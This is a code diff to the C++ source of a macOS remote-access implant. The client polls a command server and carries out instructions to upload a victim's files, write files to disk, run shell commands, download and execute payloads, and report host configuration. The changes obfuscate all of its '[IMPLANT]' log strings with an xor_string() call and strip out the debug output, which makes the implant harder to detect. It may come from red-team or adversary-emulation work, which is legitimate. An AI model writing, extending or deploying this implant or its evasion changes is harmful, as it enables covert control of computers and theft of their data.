@@ -11,7 +11,7 @@ namespace client {
 
         fp = popen(cmd.c_str(), "r");
         if (fp == NULL) {
-            std::cout << "[IMPLANT] Failed to run command" << std::endl;
+            std::cout << xor_string("[IMPLANT] Failed to run command") << std::endl;
         }
 
         while (fgets(line, sizeof(line), fp) != NULL) {
@@ -21,7 +21,7 @@ namespace client {
         pclose(fp);
 
         if (output == "") {
-            std::cout << "[IMPLANT] Output is empty for cmd: " + cmd << std::endl;
+            std::cout << xor_string("[IMPLANT] Output is empty for cmd: ") + cmd << std::endl;
         }
 
         return output;
@@ -55,7 +55,7 @@ namespace client {
         std::ofstream out_file(path, std::ios::out);
 
         if (!out_file) {
-            std::cout << "[IMPLANT] File not created" << std::endl;
+            std::cout << xor_string("[IMPLANT] File not created") << std::endl;
             return false;
         }
         else {
@@ -68,7 +68,7 @@ namespace client {
         std::ifstream in_file(path);
 
         if (!in_file) {
-            std::cout << "[IMPLANT] File could not be opened for reading" << std::endl;
+            std::cout << xor_string("[IMPLANT] File could not be opened for reading") << std::endl;
             return std::vector<unsigned char>();
         }
         else {
@@ -97,14 +97,14 @@ namespace client {
             CFStringGetCString(cf, buffer, 64, kCFStringEncodingUTF8);
             return buffer;
         }
-        std::cout << "[IMPLANT] Error: cannot retrieve computer name" << std::endl;
+        std::cout << xor_string("[IMPLANT] Error: cannot retrieve computer name") << std::endl;
         return "";
     }
 
     std::string getHardwareName() {
         struct utsname buffer;
         if (uname(&buffer) < 0) {
-            std::cout << "[IMPLANT] Error: cannot retrieve hardware name" << std::endl;
+            std::cout << xor_string("[IMPLANT] Error: cannot retrieve hardware name") << std::endl;
             return "";
         }
         return buffer.machine;
@@ -115,7 +115,7 @@ bool ClientPP::osInfo (int dwRandomTimeSleep, ClientPP * c) {
     bool completed_discovery = false;
     // if parameters are populated, just return true
     if (c->strClientID != "") {
-        std::cout << "[IMPLANT] Client ID already populated as: " + c->strClientID << std::endl;
+        std::cout << xor_string("[IMPLANT] Client ID already populated as: ") + c->strClientID << std::endl;
         return true;
     }
 
@@ -192,28 +192,16 @@ void ClientPP::runClient(int dwRandomTimeSleep, ClientPP * c, void * dylib) {
     std::vector<unsigned char> response_vector(response_buffer, response_buffer + response_length);
 
     if (response_vector.size() == 0) {
-        std::cout << "[IMPLANT] No response returned from communication library" << std::endl;
+        std::cout << xor_string("[IMPLANT] No response returned from communication library") << std::endl;
     }
     else {
         Communication packet = Communication(response_vector);
 
-        // just for debugging ******
-        std::cout << "[IMPLANT] Response buffer contains: \n";
-
-        std::cout << "  Key: ";
         std::vector<unsigned char> key = Communication::getKey(packet);
         std::string key_str(key.begin(), key.end());
-        std::cout << key_str << std::endl;
 
-        std::cout << "  Payload: ";
         std::vector<unsigned char> payload = Communication::getPayload(packet);
         std::string payload_str(payload.begin(), payload.end());
-        std::cout << payload_str << std::endl;
-
-        std::cout << "  Instruction: ";
-        printf("%.2X", Communication::getInstruction(packet));
-        std::cout << std::endl;
-        // just for debugging ******
 
         unsigned char dwCommand = Communication::getInstruction(packet);
 
@@ -225,16 +213,16 @@ void ClientPP::runClient(int dwRandomTimeSleep, ClientPP * c, void * dylib) {
         // receive and extract instruction
         if (dwCommand == 0x55) {
             // no tasks available
-            std::cout << "[IMPLANT] Recieved empty response/heartbeat instruction" << std::endl;
+            std::cout << xor_string("[IMPLANT] Recieved empty response/heartbeat instruction") << std::endl;
         }
         else if (dwCommand == 0x72) {
             // upload file
-            std::cout << "[IMPLANT] Received upload file instruction" << std::endl;
+            std::cout << xor_string("[IMPLANT] Received upload file instruction") << std::endl;
             std::vector<unsigned char> path = Communication::getPayload(packet);
             std::string path_str(path.begin(), path.end());
             std::vector<unsigned char> upload_file = client::readFile(path_str);
             if (upload_file.size() == 0) {
-                std::cout << "[IMPLANT] Read file for upload failed" << std::endl;
+                std::cout << xor_string("[IMPLANT] Read file for upload failed") << std::endl;
             }
             else {
                 unsigned char upload_instruction[] = {dwCommand, 0x00, 0x00, 0x00};
@@ -243,16 +231,16 @@ void ClientPP::runClient(int dwRandomTimeSleep, ClientPP * c, void * dylib) {
         }
         else if (dwCommand == 0x23 || dwCommand == 0x3C ) {
             // download file
-            std::cout << "[IMPLANT] Received download file instruction" << std::endl;
+            std::cout << xor_string("[IMPLANT] Received download file instruction") << std::endl;
             std::vector<unsigned char> fileBytes = Communication::getPayload(packet);
             bool success = client::writeFile(fileBytes, c->pathProcess + "/" + client::DOWNLOAD_FILE_NAME);
             if (!success) {
-                std::cout << "[IMPLANT] Write file for download failed" << std::endl;
+                std::cout << xor_string("[IMPLANT] Write file for download failed") << std::endl;
             }
         }
         else if (dwCommand == 0xAC) {
             // run command in terminal
-            std::cout << "[IMPLANT] Received run command in terminal instruction" << std::endl;
+            std::cout << xor_string("[IMPLANT] Received run command in terminal instruction") << std::endl;
             std::vector<unsigned char> command = Communication::getPayload(packet);
             std::string command_str(payload.begin(), payload.end());
             std::string output = client::executeCmd(command_str);
@@ -266,11 +254,11 @@ void ClientPP::runClient(int dwRandomTimeSleep, ClientPP * c, void * dylib) {
         }
         else if (dwCommand == 0xA2) {
             // download file and execute
-            std::cout << "[IMPLANT] Received download and execute file instruction" << std::endl;
+            std::cout << xor_string("[IMPLANT] Received download and execute file instruction") << std::endl;
             std::vector<unsigned char> fileBytes = Communication::getPayload(packet);
             bool success = client::writeFile(fileBytes, c->pathProcess + "/" + client::DOWNLOAD_FILE_NAME);
             if (!success) {
-                std::cout << "[IMPLANT] Download failed" << std::endl;
+                std::cout << xor_string("[IMPLANT] Download failed") << std::endl;
             }
             else {
                 unsigned char download_exec_instruction[] = {dwCommand, 0x00, 0x00, 0x00};
@@ -281,14 +269,14 @@ void ClientPP::runClient(int dwRandomTimeSleep, ClientPP * c, void * dylib) {
         }
         else if (dwCommand == 0x07) {
             // get config info
-            std::cout << "[IMPLANT] Received get config info instruction" << std::endl;
+            std::cout << xor_string("[IMPLANT] Received get config info instruction") << std::endl;
             unsigned char get_config_instruction[] = {dwCommand, 0x00, 0x00, 0x00};
             std::string config_info = "Config Info:\nID: " + c->strClientID + "\nPath: " + c->pathProcess + "\nInstall Time: " + std::to_string(c->installTime);
             ClientPP::performHTTPRequest(c->dylib, "POST", std::vector<unsigned char>(config_info.begin(), config_info.end()), get_config_instruction, c->strClientID, result_response_buffer_ptr, result_response_length_ptr);
         }
         else if (dwCommand == 0x33) {
             // get a file size
-            std::cout << "[IMPLANT] Received get file size instruction" << std::endl;
+            std::cout << xor_string("[IMPLANT] Received get file size instruction") << std::endl;
             unsigned char get_filesize_instruction[] = {dwCommand, 0x00, 0x00, 0x00};
             std::vector<unsigned char> path = Communication::getPayload(packet);
             std::string path_str(path.begin(), path.end());
@@ -298,11 +286,11 @@ void ClientPP::runClient(int dwRandomTimeSleep, ClientPP * c, void * dylib) {
         }
         else if (dwCommand == 0xe8) {
             // exit
-            std::cout << "[IMPLANT] Received exit instruction" << std::endl;
+            std::cout << xor_string("[IMPLANT] Received exit instruction") << std::endl;
             exit(0);
         }
         else {
-            std::cout << "[IMPLANT] Received unfamiliar instruction" << std::endl;
+            std::cout << xor_string("[IMPLANT] Received unfamiliar instruction") << std::endl;
         }
     }
 
@@ -324,7 +312,7 @@ void ClientPP::createClientID(ClientPP * c) {
     //  randomly generated UUID - uuidgen
     std::string random_uuid = client::executeCmd("uuidgen");
     random_uuid = random_uuid.substr(0, random_uuid.size() -1 );
-    std::cout << "[IMPLANT] uuidgen returned: " + random_uuid << std::endl;
+    std::cout << xor_string("[IMPLANT] uuidgen returned: ") + random_uuid << std::endl;
 
     // replace with this line to create a new random UUID for each implant session
     // std::string cmd = "echo " + serial_number + platform_uuid + mac_address + random_uuid + " | md5 | xxd -r -p | base64";
@@ -343,7 +331,7 @@ void ClientPP::performHTTPRequest(void* dylib, std::string type, std::vector<uns
     // loads CommsLib exported function that generates the HTTP request
     void (*sendRequest)(const char * str, const std::vector<unsigned char> data, unsigned char ** response, int ** response_length, unsigned char ** instr, const char * clientID) = (void(*)(const char*, const std::vector<unsigned char>, unsigned char**, int**, unsigned char **, const char *))dlsym(dylib, "sendRequest");
     if (sendRequest == NULL) {
-        std::cout << "[IMPLANT] unable to load libComms.dylib sendRequest" << std::endl;
+        std::cout << xor_string("[IMPLANT] unable to load libComms.dylib sendRequest") << std::endl;
         dlclose(dylib);
     }
 
